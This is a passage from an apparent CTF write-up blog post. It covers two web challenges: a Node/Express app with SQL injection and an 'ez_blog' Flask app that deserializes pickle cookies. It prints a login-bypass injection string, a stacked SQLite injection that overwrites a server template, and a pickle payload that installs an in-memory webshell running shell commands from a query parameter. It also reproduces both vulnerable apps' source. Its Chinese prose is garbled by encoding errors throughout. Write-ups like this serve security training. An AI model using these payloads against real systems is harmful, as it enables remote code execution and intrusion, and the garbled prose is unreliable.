res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//todoing</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'é€€å‡ºæ—¶å‘ç”Ÿé”™è¯¯:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'é€€å‡ºå¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">const</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT * FROM users WHERE (username = "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">") AND password = ("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  db<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> user</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'è´¦å·å¯†ç å‡ºé”™ï¼ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">id</span><span class="token operator">:</span> user<span class="token punctuation">.</span>id<span class="token punctuation">,</span>      <span class="token literal-property property">username</span><span class="token operator">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>      <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> user<span class="token punctuation">.</span>is_admin<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> confirmPassword <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">!==</span> confirmPassword<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ä¸¤æ¬¡è¾“å…¥çš„å¯†ç ä¸ä¸€è‡´'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  db<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>    <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">INSERT INTO users (username, password) VALUES ('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">', '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'æ³¨å†Œå¤±è´¥:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ³¨å†Œå¤±è´¥ï¼Œç”¨æˆ·åå¯èƒ½å·²å­˜åœ¨'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> filename <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'WAF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'../../'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'.././'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    filename<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'//'</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'WAF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename <span class="token operator">||</span> path<span class="token punctuation">.</span><span class="token function">isAbsolute</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ— æ•ˆæ–‡ä»¶å'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'documents'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">download</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ–‡ä»¶ä¸å­˜åœ¨'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server running on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“‡è¿˜æœ‰ wafï¼Œä½ åæ­»äº†å–µğŸ˜­ğŸ‘Š</p><p>æ­¤æ—¶æ‰å‘ç° &#x2F;login å¯ä»¥ç›´æ¥æ³¨å…¥ <code>1&quot;) or 1=1--+</code> å®ç°ç™»å½•</p><p>è®¿é—® &#x2F;upload å‘ç° upload æ¨¡æ¿æ²¡å†™ç©ºå‡ºæ¥äº†ï¼Œé‚£è¿˜è¯´å•¥äº†ï¼Œç›´æ¥ sqlite æ³¨å…¥ç»§ç»­å†™ upload.ejs åŒ…å« flag å°±å®Œäº‹äº†ï¼Œæ³¨æ„ä¾æ—§åœ¨ &#x2F;register æ³¨å…¥ï¼Œåªæœ‰è¿™é‡Œç”¨çš„æ˜¯ exec èƒ½å †å æ³¨å…¥</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">aaa&#39;,&#39;1&#39;);ATTACH DATABASE &#39;&#x2F;app&#x2F;views&#x2F;upload.ejs&#39; AS shell;create TABLE shell.exp (webshell text);insert INTO shell.exp (webshell) VALUES (&#39;&lt;%- include(&quot;&#x2F;fla4444444aaaaaagg.txt&quot;); %&gt;&#39;);--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/IMG-20251011232238322.png"></p><hr><h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p>è®¿å®¢åªèƒ½ç”¨è®¿å®¢è´¦å·ç™»å½•ï¼Œé‚£ä¹ˆå®¹æ˜“æ³¨æ„åˆ°å¸å¯† guest:guest</p><p>è¿”å› Tokenï¼š<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</code></p><p>æ²¡è§è¿‡ï¼Ÿhex è§£ç å†ç”¨ base64 åŠ å¯†ä¸€ä¸‹å°±ä¼šå‘ç°æ ¼å¼å’Œ pickle åºåˆ—åŒ–å­—ç¬¦ä¸²å¾ˆåƒ</p><p>pickletools è§£ä¸€ä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">75</span>   <span class="token number">11</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'app'</span>   <span class="token number">16</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token number">17</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'User'</span>   <span class="token number">23</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token number">24</span><span class="token punctuation">:</span> \x93 STACK_GLOBAL   <span class="token number">25</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token number">26</span><span class="token punctuation">:</span> <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">27</span><span class="token punctuation">:</span> \x81 NEWOBJ   <span class="token number">28</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token number">29</span><span class="token punctuation">:</span> <span class="token punctuation">&#125;</span>    EMPTY_DICT   <span class="token number">30</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token number">31</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK   <span class="token number">32</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'id'</span>   <span class="token number">36</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token number">37</span><span class="token punctuation">:</span> K        BININT1    <span class="token number">2</span>   <span class="token number">39</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'username'</span>   <span class="token number">49</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">6</span><span class="token punctuation">)</span>   <span class="token number">50</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'guest'</span>   <span class="token number">57</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">7</span><span class="token punctuation">)</span>   <span class="token number">58</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'is_admin'</span>   <span class="token number">68</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token number">69</span><span class="token punctuation">:</span> \x89     NEWFALSE   <span class="token number">70</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'logged_in'</span>   <span class="token number">81</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">9</span><span class="token punctuation">)</span>   <span class="token number">82</span><span class="token punctuation">:</span> \x88     NEWTRUE   <span class="token number">83</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">31</span><span class="token punctuation">)</span>   <span class="token number">84</span><span class="token punctuation">:</span> b    BUILD   <span class="token number">85</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠ is_admin å­—æ®µä¿®æ”¹ä¸º true å³å¯ï¼Œæ€ä¹ˆä¿®æ”¹å‘¢ï¼ŒFalse æ˜¯ 89ï¼Œè€Œ True æ˜¯ 88ï¼Œç›´æ¥ä¿®æ”¹ hex å­—èŠ‚æµå³å¯ï¼š<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94888c096c6f676765645f696e948875622e</code></p><p>ä»¥ admin è®¿é—® &#x2F;add å‘ç°æ²¡ä»€ä¹ˆåˆ«çš„ä¸œè¥¿ï¼Œé‚£ç›´æ¥æ‰“ååºåˆ—åŒ– payload å‘—</p><p>å†…å­˜é©¬ç›´æ¥æ‰“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> C<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag åœ¨ &#x2F;thisisthefffflllaaaggg.txt</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request <span class="token keyword">as</span> flask_request<span class="token punctuation">,</span> g<span class="token keyword">import</span> sqlite3<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span class="token comment"># ç”¨æˆ·ç±»å®šä¹‰</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> user_id<span class="token punctuation">,</span> username<span class="token punctuation">,</span> is_admin<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> user_id        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>is_admin <span class="token operator">=</span> is_admin        self<span class="token punctuation">.</span>logged_in <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        serialized <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        hex_encoded <span class="token operator">=</span> serialized<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> hex_encoded    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>hex_encoded<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            serialized <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex_encoded<span class="token punctuation">)</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialized<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span>    static_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">,</span>    static_url_path<span class="token operator">=</span><span class="token string">'/banbanbannonono'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token comment"># æ•°æ®åº“é…ç½®</span>DATABASE <span class="token operator">=</span> <span class="token string">'./blog.db'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>context_processor</span><span class="token keyword">def</span> <span class="token function">inject_variables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> get_current_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">'current_year'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>year<span class="token punctuation">,</span>        <span class="token string">'is_admin'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>is_admin <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token string">''</span>    <span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_hex <span class="token operator">=</span> flask_request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user_hex<span class="token punctuation">:</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>user_hex<span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>logged_in<span class="token punctuation">:</span>            <span class="token keyword">return</span> user    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">get_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>DATABASE<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>row_factory <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>Row    <span class="token keyword">return</span> db<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>teardown_appcontext</span><span class="token keyword">def</span> <span class="token function">close_connection</span><span 